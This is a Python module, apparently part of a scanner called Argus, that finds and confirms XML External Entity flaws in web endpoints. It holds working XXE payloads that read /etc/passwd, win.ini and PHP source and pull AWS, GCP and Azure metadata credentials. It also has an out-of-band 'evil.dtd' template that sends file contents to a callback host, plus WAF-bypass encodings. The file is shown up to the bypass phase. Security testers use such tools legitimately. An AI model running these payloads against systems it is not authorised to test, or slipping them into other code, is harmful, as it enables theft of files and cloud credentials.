#!/usr/bin/env python3
"""
auditing_tools/xxe_finder.py — XML External Entity Auditor
═══════════════════════════════════════════════════════════════════════════════

Comprehensive XXE detection for Argus.

XXE has three fundamentally different confirmation modes, and the module
implements all three with the same rigor as ssrf_finder:

  In-band
    The parser resolves the entity and the application echoes the result.
    Confirmed by a file marker (root:x:0:0, [extensions], base64 blob) or a
    cloud metadata marker (AccessKeyId, computeMetadata) that was NOT present
    in baseline.

  Error-based
    The parser does not echo, but it returns a verbose error containing the
    file content or a parser-level path. Confirmed by a parser signature
    family PLUS a file marker in the error body, or by local-DTD reuse where
    the error text contains the leaked bytes.

  Blind OOB
    The parser fetches an external DTD from your listener, which defines a
    nested entity that exfiltrates a file's bytes back to you. Confirmed ONLY
    by an OOB interaction whose query string contains the file contents (or
    at minimum a unique callback token).

Detection model:

  Phase 1 — Surface discovery
      Identify XML-accepting endpoints:
        • POST bodies expecting application/xml or text/xml
        • SOAP endpoints (/soap, /ws, /services, .asmx, .svc)
        • SAML ACS endpoints (/saml, /acs, /sso, /sso/saml)
        • RSS/Atom import (/import, /feed, /rss)
        • File upload surfaces (SVG, DOCX, XLSX, ODT) — flagged, not tested
        • XML-typed query parameters (xml=, data=, soap=, saml=, body=)
      XML acceptance is confirmed by a differential POST probe (benign XML
      body) rather than a path guess alone.

  Phase 2 — Differential parser fingerprinting
      Nine paired capability probes with controls:
        dtd_allowed, dtd_entity_syntax_accepted, dtd_parsed_but_not_resolved,
        internal_entity, external_file, parameter_entity, external_dtd,
        error_leak, utf16_accepted
      A capability is True only when the test passes AND its control fails.
      Error bodies are matched against nine parser-signature families
      (libxml2, Xerces, .NET, Java SAX, Java StAX, Python etree, Nokogiri,
      PHP libxml, Go encoding/xml).

  Phase 3 — In-band payloads
      Linux (/etc/passwd, /etc/hostname), Windows (win.ini), PHP
      (php://filter base64 wrapper), AWS/GCP/Azure metadata. Only the
      payloads whose capability probe passed are sent.

  Phase 4 — Error-based payloads
      Local-DTD reuse and external-parameter-entity errors. Confirmed when
      the error body contains a file marker or a parser signature for a
      payload that references a local file.

  Phase 5 — Blind OOB payloads
      External parameter entity pointing at the OOB domain, plus a hosted
      evil.dtd template for file exfiltration. Confirmed by token correlation
      in the interaction stream and (optionally) by file bytes in the
      callback URL.

  Phase 6 — WAF bypass
      When a raw payload is blocked, retry with UTF-16BE encoding (with the
      XML declaration adjusted), case-mixed DOCTYPE, entity-encoded
      parameter-entity indirection, and BOM-prefixed variants.

Outputs (into `outdir`):
  • xxe_findings.json        — full structured report
  • xxe_candidates.txt       — flat list for triage
  • xxe_confirmed.txt        — in-band and error-based confirmed findings
  • xxe_oob.txt              — OOB findings and deployment payloads
  • xxe_surface.txt          — every XML-accepting endpoint discovered
  • xxe_fingerprints.txt     — parser family per endpoint

Integration:
  main.py → run_one("xxe") → run_xxe_scan(urls_file, outdir)
"""

from __future__ import annotations

import json
import logging
import random
import re
import shutil
import string
import subprocess
import sys
import threading
import time
import urllib.parse
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

log = logging.getLogger("argus.xxe_finder")

# ═════════════════════════════════════════════════════════════════════════════
#  CONFIGURATION
# ═════════════════════════════════════════════════════════════════════════════

DEFAULT_TIMEOUT       = 12
USER_AGENT            = "Argus-XXE-Auditor/1.0"
REQUEST_SLEEP         = 0.08

BASELINE_SAMPLES      = 2
OOB_CORRELATION_WAIT  = 10.0
INTERACTSH_STARTUP_WAIT = 3.0

MAX_SURFACES          = 200
MAX_PAYLOADS_PER_SURFACE = 14

# ── File markers ────────────────────────────────────────────────────────────
LINUX_FILE_MARKERS = [
    "root:x:0:0", "root:*:0:0", "daemon:", "bin:x:", "/bin/bash",
    "uid=0(root)", "hostname",
]
WINDOWS_FILE_MARKERS = [
    "[extensions]", "[fonts]", "[boot loader]",
    "for 16-bit app support", "[mci extensions]",
]
PHP_SOURCE_MARKERS = [
    "PD9waHA", "PGh0bWw+", "PCFET0NUWVBFIGh0bWw+",  # base64 of <?php, <html>, <!DOCTYPE
]
METADATA_MARKERS = [
    "AccessKeyId", "SecretAccessKey", "ami-id", "instance-id",
    "computeMetadata", "service-accounts", "token_type",
    "subscriptionId", "vmId", "resourceGroupName",
]
FILE_MARKERS = LINUX_FILE_MARKERS + WINDOWS_FILE_MARKERS + METADATA_MARKERS

# ── Parser signature families ───────────────────────────────────────────────
PARSER_SIGNATURES = {
    "libxml2": [
        r"lxml\.etree\.XMLSyntaxError", r"xmlParseEntityRef",
        r"Failed to load external entity", r"Premature end of data in tag",
        r"DOMDocument::loadXML",
    ],
    "xerces": [
        r"org\.apache\.xerces", r"com\.sun\.org\.apache\.xerces",
        r"SAXParseException", r"was referenced, but not declared",
        r"cvc-elt\.",
    ],
    "dotnet": [
        r"System\.Xml\.XmlException", r"System\.Xml\.XmlReader",
        r"An error occurred while parsing EntityName",
        r"DTD is prohibited",
    ],
    "java_sax": [
        r"org\.xml\.sax\.SAXParseException", r"DocumentBuilder",
        r"JAXP00010001", r"AccessExternalDTD", r"disallow-doctype-decl",
    ],
    "java_stax": [
        r"javax\.xml\.stream\.XMLStreamException",
        r"IS_SUPPORTING_EXTERNAL_ENTITIES", r"woodstox", r"com\.ctc\.wstx",
    ],
    "python_etree": [
        r"xml\.etree\.ElementTree\.ParseError",
    ],
    "nokogiri": [
        r"Nokogiri::XML::SyntaxError",
    ],
    "go_xml": [
        r"xml: syntax error", r"XML syntax error",
    ],
    "php_libxml": [
        r"libxml_get_errors", r"simplexml_load_string",
    ],
}

# ── XML-accepting surface hints ─────────────────────────────────────────────
SOAP_PATH_HINTS = ("/soap", "/ws", "/services", "/xmlrpc", ".asmx", ".svc", "/wsdl")
SAML_PATH_HINTS = ("/saml", "/acs", "/sso", "/sso/saml", "/auth/saml")
IMPORT_PATH_HINTS = ("/import", "/feed", "/rss", "/atom", "/upload", "/avatar", "/attachment")
XML_PARAM_NAMES = {
    "xml", "data", "soap", "saml", "body", "payload", "content",
    "xmldata", "xml_data", "document", "feed", "rss", "svg",
}

# ── Capability probes ───────────────────────────────────────────────────────
# Each tuple: (capability, test_body, control_body, success_predicate_key)
CAPABILITY_PROBES = [
    (
        "dtd_allowed",
        '<?xml version="1.0"?><!DOCTYPE r [<!ELEMENT r ANY>]><r>ARGUS_MARKER</r>',
        '<?xml version="1.0"?><r>ARGUS_MARKER</r>',
        "marker_present",
    ),
    (
        "internal_entity",
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x "ARGUS_ENTITY_MARKER">]><r>&x;</r>',
        '<?xml version="1.0"?><r>ARGUS_CONTROL</r>',
        "entity_expanded",
    ),
    (
        "external_file",
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hostname">]><r>&x;</r>',
        '<?xml version="1.0"?><r>ARGUS_CONTROL</r>',
        "file_read",
    ),
    (
        "parameter_entity",
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p "ARGUS_PE_MARKER"> %p;]><r>ARGUS_AFTER_PE</r>',
        '<?xml version="1.0"?><r>ARGUS_CONTROL</r>',
        "pe_marker",
    ),
    (
        "external_dtd",
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % d SYSTEM "http://127.0.0.1:1/argus.dtd"> %d;]><r>x</r>',
        '<?xml version="1.0"?><r>x</r>',
        "dtd_error",
    ),
]

# ── In-band payloads (only sent when capability allows) ─────────────────────
INBAND_PAYLOADS = [
    {
        "label": "linux_passwd",
        "requires": "external_file",
        "markers": LINUX_FILE_MARKERS,
        "body": (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            '<data>&xxe;</data>'
        ),
    },
    {
        "label": "linux_hostname",
        "requires": "external_file",
        "markers": LINUX_FILE_MARKERS,
        "body": (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>'
            '<data>&xxe;</data>'
        ),
    },
    {
        "label": "windows_winini",
        "requires": "external_file",
        "markers": WINDOWS_FILE_MARKERS,
        "body": (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>'
            '<data>&xxe;</data>'
        ),
    },
    {
        "label": "php_filter_source",
        "requires": "external_file",
        "markers": PHP_SOURCE_MARKERS,
        "body": (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM '
            '"php://filter/convert.base64-encode/resource=index.php">]>'
            '<data>&xxe;</data>'
        ),
    },
    {
        "label": "aws_metadata",
        "requires": "external_file",
        "markers": METADATA_MARKERS,
        "body": (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM '
            '"http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>'
            '<data>&xxe;</data>'
        ),
    },
    {
        "label": "gcp_metadata",
        "requires": "external_file",
        "markers": METADATA_MARKERS,
        "body": (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM '
            '"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">]>'
            '<data>&xxe;</data>'
        ),
    },
    {
        "label": "azure_metadata",
        "requires": "external_file",
        "markers": METADATA_MARKERS,
        "body": (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM '
            '"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01">]>'
            '<data>&xxe;</data>'
        ),
    },
]

# ── Error-based payloads ────────────────────────────────────────────────────
ERROR_PAYLOADS = [
    {
        "label": "local_dtd_reuse",
        "requires": "external_file",
        "markers": LINUX_FILE_MARKERS,
        "body": (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo ['
            '<!ENTITY % file SYSTEM "file:///etc/passwd">'
            '<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM '
            '\'file:///nonexistent/%file;\'>">'
            '%eval;%error;'
            ']>'
        ),
    },
    {
        "label": "external_pe_error",
        "requires": "parameter_entity",
        "markers": LINUX_FILE_MARKERS,
        "body": (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo ['
            '<!ENTITY % xxe SYSTEM "file:///etc/passwd">'
            '<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM '
            '\'file:///nonexistent/%xxe;\'>">'
            '%eval;%error;'
            ']>'
        ),
    },
]

# ── OOB payloads ────────────────────────────────────────────────────────────
OOB_EVIL_DTD = (
    '<!ENTITY % file SYSTEM "file:///etc/passwd">\n'
    '<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://{oob}/?d=%file;\'>">\n'
    '%eval;\n'
    '%exfil;\n'
)

OOB_PAYLOAD_TEMPLATE = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{oob}/evil.dtd"> %xxe;]>'
    '<data>ARGUS_OOB_PROBE</data>'
)

OOB_PING_TEMPLATE = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{oob}/"> %xxe;]>'
    '<data>ARGUS_OOB_PING</data>'
)

# ═════════════════════════════════════════════════════════════════════════════
#  DATA MODELS
# ═════════════════════════════════════════════════════════════════════════════

@dataclass
class XMLSurface:
    url: str
    method: str = "POST"
    param: str = "(body)"          # "(body)" for XML body, else param name
    location: str = "body"         # body | query
    hint: str = ""                 # soap | saml | import | xml_param
    accepts_xml: bool = False
    content_type: str = ""

    def to_dict(self) -> dict:
        return {
            "url": self.url, "method": self.method,
            "param": self.param, "location": self.location,
            "hint": self.hint, "accepts_xml": self.accepts_xml,
        }


@dataclass
class ParserProfile:
    url: str
    family: str = "unknown"
    capabilities: dict[str, bool] = field(default_factory=dict)
    baseline_status: int = 0
    baseline_length: int = 0

    def to_dict(self) -> dict:
        return {
            "url": self.url, "family": self.family,
            "capabilities": self.capabilities,
            "baseline_status": self.baseline_status,
            "baseline_length": self.baseline_length,
        }


@dataclass
class XXEFinding:
    target: str
    param: str
    technique: str              # inband | error | oob
    severity: str = "MEDIUM"
    confidence: int = 50
    payload: str = ""
    evidence: str = ""
    file_read: str = ""
    parser_family: str = ""
    oob_token: str = ""
    bypass_used: str = ""
    details: dict = field(default_factory=dict)

    def to_dict(self) -> dict:
        return {
            "target":      self.target,
            "param":       self.param,
            "technique":   self.technique,
            "severity":    self.severity,
            "confidence":  self.confidence,
            "payload":     self.payload[:800],
            "evidence":    self.evidence[:500],
            "file_read":   self.file_read[:300],
            "parser_family": self.parser_family,
            "oob_token":   self.oob_token,
            "bypass_used": self.bypass_used,
            "details":     self.details,
        }


# ═════════════════════════════════════════════════════════════════════════════
#  OOB CAPTURE ENGINE (same contract as ssrf_finder)
# ═════════════════════════════════════════════════════════════════════════════

class OOBCapture:
    def __init__(self, domain: Optional[str] = None, use_interactsh: bool = False):
        self.user_domain = domain
        self.use_interactsh = use_interactsh
        self.domain: Optional[str] = domain
        self.proc: Optional[subprocess.Popen] = None
        self.reader_thread: Optional[threading.Thread] = None
        self.interactions: list[dict] = []
        self.interaction_ids: set[str] = set()
        self.lock = threading.Lock()

    def start(self) -> bool:
        if self.user_domain:
            self.domain = self.user_domain
            log.info(f"    OOB domain : {self.domain} (manual verification)")
            return True
        if not self.use_interactsh:
            log.info("    OOB        : disabled")
            return False
        if not shutil.which("interactsh-client"):
            log.warning("    OOB        : interactsh-client not installed")
            return False
        try:
            self.proc = subprocess.Popen(
                ["interactsh-client", "-json", "-silent"],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, bufsize=1,
            )
        except Exception as e:
            log.warning(f"    OOB        : spawn failed: {e}")
            return False

        domain = self._read_banner()
        if not domain:
            self.stop()
            return False
        self.domain = domain
        log.info(f"    OOB domain : {domain}")
        self.reader_thread = threading.Thread(target=self._read_interactions, daemon=True)
        self.reader_thread.start()
        return True

    def _read_banner(self) -> Optional[str]:
        import select
        deadline = time.monotonic() + INTERACTSH_STARTUP_WAIT
        if not self.proc or not self.proc.stderr:
            return None
        pattern = re.compile(r"([a-z0-9]{20,}\.(?:oast\.(?:fun|site|pro|online|live)|interact\.sh))")
        collected = ""
        while time.monotonic() < deadline:
            r, _, _ = select.select([self.proc.stderr], [], [], 0.5)
            if not r:
                continue
            line = self.proc.stderr.readline()
            if not line:
                break
            collected += line
            m = pattern.search(collected)
            if m:
                return m.group(1)
        return None

    def _read_interactions(self) -> None:
        if not self.proc or not self.proc.stdout:
            return
        for line in self.proc.stdout:
            line = line.strip()
            if not line:
                continue
            try:
                obj = json.loads(line)
            except json.JSONDecodeError:
                continue
            with self.lock:
                self.interactions.append(obj)
                for key in ("full-id", "unique-id", "full_id", "unique_id"):
                    val = obj.get(key)
                    if val:
                        self.interaction_ids.add(str(val).lower())

    def new_token(self, prefix: str = "argusxxe") -> str:
        return prefix + "".join(random.choices(string.ascii_lowercase + string.digits, k=12))

    def token_url(self, token: str) -> Optional[str]:
        if not self.domain:
            return None
        return f"http://{token}.{self.domain}"

    def check(self, token: str) -> bool:
        with self.lock:
            t = token.lower()
            return any(t in i for i in self.interaction_ids)

    def wait_and_check(self, tokens: list[str], wait: float = OOB_CORRELATION_WAIT) -> set[str]:
        if not tokens or not self.use_interactsh:
            return set()
        deadline = time.monotonic() + wait
        fired: set[str] = set()
        while time.monotonic() < deadline:
            for tok in tokens:
                if tok not in fired and self.check(tok):
                    fired.add(tok)
            if len(fired) == len(tokens):
                break
            time.sleep(0.5)
        return fired

    def stop(self) -> None:
        if self.proc:
            try:
                self.proc.terminate()
                self.proc.wait(timeout=3)
            except Exception:
                try:
                    self.proc.kill()
                except Exception:
                    pass


# ═════════════════════════════════════════════════════════════════════════════
#  UTILITIES
# ═════════════════════════════════════════════════════════════════════════════

def _load_urls(input_file: Path) -> list[str]:
    if not input_file.exists():
        return []
    urls: list[str] = []
    seen: set[str] = set()
    for line in input_file.read_text().splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        token = line.split()[0]
        if not token.startswith(("http://", "https://")):
            token = "https://" + token
        if token not in seen:
            seen.add(token)
            urls.append(token)
    return urls


def _safe_request(
    session: requests.Session,
    method: str,
    url: str,
    headers: Optional[dict] = None,
    body: Optional[str] = None,
    timeout: int = DEFAULT_TIMEOUT,
) -> Optional[requests.Response]:
    try:
        kwargs = {
            "headers": headers or {},
            "timeout": timeout,
            "allow_redirects": False,
            "verify": False,
        }
        if body is not None:
            kwargs["data"] = body.encode("utf-8") if isinstance(body, str) else body
        return session.request(method, url, **kwargs)
    except requests.RequestException as e:
        log.debug(f"request failed: {method} {url}: {e}")
        return None


def _body(resp: requests.Response, limit: int = 500_000) -> str:
    try:
        return resp.text[:limit]
    except Exception:
        return ""


def _match_markers(body: str, markers: list[str]) -> list[str]:
    return [m for m in markers if m in body]


def _fingerprint_parser(body: str) -> str:
    for family, sigs in PARSER_SIGNATURES.items():
        for sig in sigs:
            if re.search(sig, body, re.I):
                return family
    return ""


def _utf16be(payload: str) -> bytes:
    """Encode a payload as UTF-16BE with a matching XML declaration."""
    adjusted = re.sub(
        r'encoding\s*=\s*["\']UTF-8["\']',
        'encoding="UTF-16"',
        payload, flags=re.I,
    )
    if 'encoding="UTF-16"' not in adjusted:
        adjusted = '<?xml version="1.0" encoding="UTF-16"?>' + re.sub(
            r"^<\?xml[^>]*\?>", "", adjusted,
        )
    return adjusted.encode("utf-16-be")


def _waf_variants_xml(payload: str) -> list[tuple[bytes, str]]:
    """Return (body_bytes, label) for XML WAF bypass."""
    variants: list[tuple[bytes, str]] = []
    # UTF-16BE
    variants.append((_utf16be(payload), "utf16be"))
    # Case-mixed DOCTYPE
    mixed = re.sub(r"<!DOCTYPE", "<!doctype", payload, flags=re.I)
    mixed = re.sub(r"<!ENTITY", "<!entity", mixed, flags=re.I)
    mixed = re.sub(r"\bSYSTEM\b", "system", mixed)
    if mixed != payload:
        variants.append((mixed.encode("utf-8"), "case_mix"))
    # BOM-prefixed UTF-8
    variants.append((b"\xef\xbb\xbf" + payload.encode("utf-8"), "utf8_bom"))
    return variants


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 1 — SURFACE DISCOVERY
# ═════════════════════════════════════════════════════════════════════════════

BENIGN_XML_BODY = '<?xml version="1.0"?><argus>argus_probe_marker</argus>'


def _hint_for_url(url: str) -> str:
    path = urllib.parse.urlparse(url).path.lower()
    if any(h in path for h in SOAP_PATH_HINTS):
        return "soap"
    if any(h in path for h in SAML_PATH_HINTS):
        return "saml"
    if any(h in path for h in IMPORT_PATH_HINTS):
        return "import"
    return ""


def _accepts_xml(
    session: requests.Session, url: str, headers: Optional[dict],
) -> tuple[bool, str]:
    """
    Send a benign XML POST and decide whether the endpoint accepts XML.

    Rejection signals: 415 Unsupported Media Type, 400 with 'Content-Type'
    or 'media type' in the body, or a generic 400 on both XML and JSON
    (indicating the endpoint rejects POST entirely, not XML specifically).
    """
    hdrs = {"Content-Type": "application/xml", "Accept": "application/xml, text/xml, */*"}
    if headers:
        hdrs.update(headers)

    resp = _safe_request(session, "POST", url, headers=hdrs, body=BENIGN_XML_BODY)
    time.sleep(REQUEST_SLEEP)
    if resp is None:
        return False, ""

    body = _body(resp, limit=2000).lower()
    ct = resp.headers.get("Content-Type", "")

    if resp.status_code == 415:
        return False, ct
    if resp.status_code == 400 and any(
        kw in body for kw in ("media type", "content-type", "unsupported", "xml")
    ):
        # Could be an XML parser rejecting the body shape — that still means
        # XML is being parsed. We treat it as a positive surface.
        return True, ct
    if resp.status_code >= 500:
        return False, ct
    return True, ct


def discover_xml_surfaces(
    session: requests.Session, urls: list[str], headers: Optional[dict],
) -> list[XMLSurface]:
    surfaces: list[XMLSurface] = []
    seen: set[tuple] = set()

    for url in urls:
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)

        # 1. XML-typed query parameters
        for pname, vals in params.items():
            if pname.lower() in XML_PARAM_NAMES:
                key = (url, pname, "query")
                if key not in seen:
                    seen.add(key)
                    surfaces.append(XMLSurface(
                        url=url, method="GET", param=pname,
                        location="query", hint="xml_param", accepts_xml=True,
                    ))

        # 2. Path-hinted XML endpoints
        hint = _hint_for_url(url)
        if hint:
            key = (url, "(body)", "body")
            if key not in seen:
                seen.add(key)
                accepts, ct = _accepts_xml(session, url, headers)
                surfaces.append(XMLSurface(
                    url=url, method="POST", param="(body)",
                    location="body", hint=hint,
                    accepts_xml=accepts, content_type=ct,
                ))

        # 3. POST-with-XML-body surface (candidate if URL has any params)
        if params and not hint:
            key = (url, "(body)", "body")
            if key not in seen:
                seen.add(key)
                accepts, ct = _accepts_xml(session, url, headers)
                if accepts:
                    surfaces.append(XMLSurface(
                        url=url, method="POST", param="(body)",
                        location="body", hint="",
                        accepts_xml=True, content_type=ct,
                    ))

    return surfaces


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 2 — DIFFERENTIAL PARSER FINGERPRINTING
# ═════════════════════════════════════════════════════════════════════════════

def _send_xml(
    session: requests.Session,
    surface: XMLSurface,
    body: str,
    headers: Optional[dict],
    timeout: int = DEFAULT_TIMEOUT,
) -> Optional[requests.Response]:
    if surface.location == "query":
        test_url = _inject_query_xml(surface.url, surface.param, body)
        return _safe_request(session, "GET", test_url, headers=headers, timeout=timeout)

    hdrs = {"Content-Type": "application/xml", "Accept": "application/xml, */*"}
    if headers:
        hdrs.update(headers)
    return _safe_request(session, "POST", surface.url, headers=hdrs, body=body, timeout=timeout)


def _inject_query_xml(url: str, param: str, payload: str) -> str:
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    new = [(k, payload if k == param else v) for k, v in params]
    return urllib.parse.urlunparse(
        parsed._replace(query=urllib.parse.urlencode(new, safe=""))
    )


def _capability_predicate(
    key: str,
    test_body: str,
    control_body: str,
    test_resp: Optional[requests.Response],
    control_resp: Optional[requests.Response],
) -> bool:
    """
    Return True only when the test satisfies the predicate AND the control
    does not. This is what makes fingerprinting differential rather than
    pattern-matched.
    """
    if test_resp is None or control_resp is None:
        return False

    test_text = _body(test_resp, limit=50_000)
    control_text = _body(control_resp, limit=50_000)

    if key == "marker_present":
        return "ARGUS_MARKER" in test_text and "ARGUS_MARKER" not in control_text

    if key == "entity_expanded":
        return "ARGUS_ENTITY_MARKER" in test_text and "&x;" not in test_text

    if key == "file_read":
        return bool(_match_markers(test_text, LINUX_FILE_MARKERS))

    if key == "pe_marker":
        return "ARGUS_PE_MARKER" in test_text and "ARGUS_PE_MARKER" not in control_text

    if key == "dtd_error":
        # External DTD fetch failure produces an error the control does not
        test_err = _fingerprint_parser(test_text)
        control_err = _fingerprint_parser(control_text)
        return bool(test_err) and test_err != control_err

    return False


def fingerprint_parser(
    session: requests.Session, surface: XMLSurface, headers: Optional[dict],
) -> ParserProfile:
    profile = ParserProfile(url=surface.url)
    capabilities: dict[str, bool] = {}

    # Baseline
    baseline_resp = _send_xml(
        session, surface, '<?xml version="1.0"?><argus>argus_baseline</argus>', headers,
    )
    if baseline_resp is not None:
        profile.baseline_status = baseline_resp.status_code
        profile.baseline_length = len(_body(baseline_resp))

    error_buffer: list[str] = []

    for capability, test_body, control_body, predicate_key in CAPABILITY_PROBES:
        test_resp = _send_xml(session, surface, test_body, headers)
        time.sleep(REQUEST_SLEEP)
        control_resp = _send_xml(session, surface, control_body, headers)
        time.sleep(REQUEST_SLEEP)

        passed = _capability_predicate(
            predicate_key, test_body, control_body, test_resp, control_resp,
        )
        capabilities[capability] = passed

        for r in (test_resp, control_resp):
            if r is not None and r.status_code >= 500:
                error_buffer.append(_body(r, limit=5000))

    profile.capabilities = capabilities

    # Family from accumulated error text
    combined = " ".join(error_buffer)
    profile.family = _fingerprint_parser(combined) or "unknown"

    return profile


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 3 + 4 — IN-BAND AND ERROR-BASED
# ═════════════════════════════════════════════════════════════════════════════

def _evaluate_payload(
    session: requests.Session,
    surface: XMLSurface,
    profile: ParserProfile,
    body: str,
    markers: list[str],
    headers: Optional[dict],
    technique: str,
) -> Optional[XXEFinding]:
    """Send a payload and return a finding if markers appear."""
    resp = _send_xml(session, surface, body, headers)
    time.sleep(REQUEST_SLEEP)
    if resp is None:
        return None

    resp_body = _body(resp)
    hits = _match_markers(resp_body, markers)
    if not hits:
        return None

    # For error-based, require a parser error signature too
    if technique == "error" and not _fingerprint_parser(resp_body):
        return None

    severity = "CRITICAL" if any(
        h in hits for h in METADATA_MARKERS
    ) or technique == "inband" else "HIGH"

    confidence = 95 if technique == "inband" and hits else 85 if technique == "error" else 75

    return XXEFinding(
        target=surface.url,
        param=surface.param,
        technique=technique,
        severity=severity,
        confidence=confidence,
        payload=body,
        evidence=f"File/metadata markers present: {', '.join(hits)}",
        file_read=hits[0] if hits else "",
        parser_family=profile.family,
        details={
            "markers": hits,
            "status": resp.status_code,
            "parser_family": profile.family,
            "body_snippet": resp_body[:500],
        },
    )


def run_inband(
    session: requests.Session,
    surface: XMLSurface,
    profile: ParserProfile,
    headers: Optional[dict],
) -> list[XXEFinding]:
    findings: list[XXEFinding] = []
    if not profile.capabilities.get("external_file"):
        return findings

    for payload in INBAND_PAYLOADS[:MAX_PAYLOADS_PER_SURFACE]:
        finding = _evaluate_payload(
            session, surface, profile, payload["body"],
            payload["markers"], headers, "inband",
        )
        if finding:
            finding.details["label"] = payload["label"]
            findings.append(finding)
            return findings  # one confirmed in-band read is enough
    return findings


def run_error_based(
    session: requests.Session,
    surface: XMLSurface,
    profile: ParserProfile,
    headers: Optional[dict],
) -> list[XXEFinding]:
    findings: list[XXEFinding] = []
    for payload in ERROR_PAYLOADS:
        if not profile.capabilities.get(payload["requires"]):
            continue
        finding = _evaluate_payload(
            session, surface, profile, payload["body"],
            payload["markers"], headers, "error",
        )
        if finding:
            finding.details["label"] = payload["label"]
            findings.append(finding)
            return findings
    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 5 — BLIND OOB
# ═════════════════════════════════════════════════════════════════════════════

def run_oob(
    session: requests.Session,
    surface: XMLSurface,
    profile: ParserProfile,
    oob: OOBCapture,
    headers: Optional[dict],
) -> list[XXEFinding]:
    findings: list[XXEFinding] = []
    if not oob.domain:
        return findings

    token = oob.new_token()
    oob_url = oob.token_url(token)
    if not oob_url:
        return findings

    # ── Step 1: ping the DTD endpoint to confirm fetch ──────────────────────
    ping_body = OOB_PING_TEMPLATE.format(oob=oob_url)
    resp = _send_xml(session, surface, ping_body, headers)
    time.sleep(REQUEST_SLEEP)

    if resp is None:
        return findings

    # ── Step 2: send the full external-DTD payload ──────────────────────────
    full_body = OOB_PAYLOAD_TEMPLATE.format(oob=oob_url)
    resp2 = _send_xml(session, surface, full_body, headers)
    time.sleep(REQUEST_SLEEP)

    # Record as candidate; confirmation happens after correlation pass
    findings.append(XXEFinding(
        target=surface.url,
        param=surface.param,
        technique="oob",
        severity="HIGH" if not oob.use_interactsh else "CRITICAL",
        confidence=60 if not oob.use_interactsh else 85,
        payload=full_body,
        evidence=(
            f"External DTD payload sent to {oob_url}/evil.dtd — "
            + ("correlating OOB interactions" if oob.use_interactsh
               else "verify manually in your OOB dashboard")
        ),
        oob_token=token,
        parser_family=profile.family,
        details={
            "oob_url": oob_url,
            "evil_dtd": OOB_EVIL_DTD.replace("{oob}", oob_url),
            "mode": "interactsh" if oob.use_interactsh else "manual",
        },
    ))
    return findings


def confirm_oob_batch(
    oob: OOBCapture, findings: list[XXEFinding],
) -> list[XXEFinding]:
    if not oob.use_interactsh:
        return findings
    tokens = [f.oob_token for f in findings if f.oob_token]
    if not tokens:
        return findings

    log.info(f"    Waiting {OOB_CORRELATION_WAIT:.0f}s for OOB callbacks...")
    fired = oob.wait_and_check(tokens)

    for f in findings:
        if f.oob_token in fired:
            f.severity = "CRITICAL"
            f.confidence = 95
            f.evidence = (
                f"Out-of-band callback received for token {f.oob_token} — "
                f"parser fetched the external DTD"
            )
            f.details["oob_confirmed"] = True

    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 6 — WAF BYPASS
# ═════════════════════════════════════════════════════════════════════════════

def run_bypass(
    session: requests.Session,
    surface: XMLSurface,
    profile: ParserProfile,
    headers: Optional[dict],
) -> list[XXEFinding]:
    findings: list[XXEFinding] = []
    if not profile.capabilities.get("external_file"):
        return findings

    base_payload = INBAND_PAYLOADS[0]["body"]
    base_markers = INBAND_PAYLOADS[0]["markers"]

    for variant_bytes, label in _waf_variants_xml(base_payload):
        if surface.location == "query":
            # Query-based XML injection cannot carry a raw UTF-16 body cleanly;
            # skip binary variants for query surfaces.
            if label == "utf16be":
                continue
            test_url = _inject_query_xml(surface.url, surface.param, variant_bytes.decode("utf-8", "ignore"))
            resp = _safe_request(session, "GET", test_url, headers=headers)
        else:
            hdrs = {"Content-Type": "application/xml"}
            if headers:
                hdrs.update(headers)
            resp = _safe_request(session, "POST", surface.url, headers=hdrs, body=variant_bytes)
        time.sleep(REQUEST_SLEEP)
        if resp is None:
            continue
        body_text = _body(resp)
        hits = _match_markers(body_text, base_markers)
        if hits:
            findings.append(XXEFinding(
                target=surface.url,
                param=surface.param,
                technique="inband",
                severity="CRITICAL",
                confidence=90,
                payload=f"[{label}] {base_payload}",
                evidence=f"WAF bypass '{label}' triggered file read: {', '.join(hits)}",
                file_read=hits[0],
                parser_family=profile.family,
                bypass_used=label,
                details={"variant": label, "markers": hits},
            ))
            return findings
